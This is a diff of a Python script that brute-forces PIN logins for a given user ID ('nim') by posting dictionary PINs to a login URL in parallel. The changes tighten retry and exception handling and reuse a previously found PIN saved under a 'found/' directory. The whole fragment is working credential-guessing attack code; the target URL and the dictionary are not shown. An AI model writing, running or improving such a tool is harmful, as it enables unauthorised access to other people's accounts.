@@ -71,11 +71,11 @@ def login(pin, depth=0):
         try:
             with requests.Session() as s:
                 data = {"usern": nim, "passw": pin}
-                r = s.post(URL, data=data)
-            if r.text == OK_TXT:
+                r = s.post(URL, data=data).text
+            if r == OK_TXT:
                 SHARED.found = True
                 return pin
-        except:
+        except RequestException:
             if depth < MAX_RETRY:
                 depth += 1
                 try:
@@ -101,12 +101,22 @@ def brute(nim, process):
     SHARED.found = False
     SHARED.exception = False
 
+    result = []
     p = multiprocessing.Pool(process)
-    result = p.map(login, DICTIONARY)
-    result = list(set(result))
-    result.remove(None)
+    try:
+        with open('found/{}'.format(nim), 'r') as f:
+            t = login(pin=f.read())
+            if t:
+                SHARED.found = True
+                result.append(t)
+    except:
+        pass
+    result += list(p.map(login, DICTIONARY))
+
     p.close()
     p.join()
+    result = list(set(result))
+    result.remove(None)
     total_time = time.time() - start_time
 
     if SHARED.exception:
